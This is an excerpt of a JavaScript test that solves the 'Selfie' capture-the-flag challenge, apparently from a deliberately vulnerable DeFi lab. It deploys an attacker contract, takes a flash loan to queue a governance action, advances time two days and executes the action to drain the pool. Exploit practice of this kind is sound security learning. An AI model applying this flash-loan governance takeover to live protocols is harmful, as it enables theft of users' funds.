...
describe("[Challenge] Selfie", function () {
  ...
  it("Execution", async function () {
    ...
    // 1. Start a flash loan from the pool
    const FlashLoanerPoolFactory = await ethers.getContractFactory(
      "SelfieFlashLoanReceiver",
      deployer
    );
    const flashLoanReceiver = await FlashLoanerPoolFactory.deploy(
      pool.address,
      token.address,
      governance.address,
      player.address
    );
    await flashLoanReceiver.executeFlashLoan();

    //wait for two days
    await time.increase(time.duration.days(2));
    const governanceWithSignature = governance.connect(player);
    await governanceWithSignature.executeAction(1);
  });
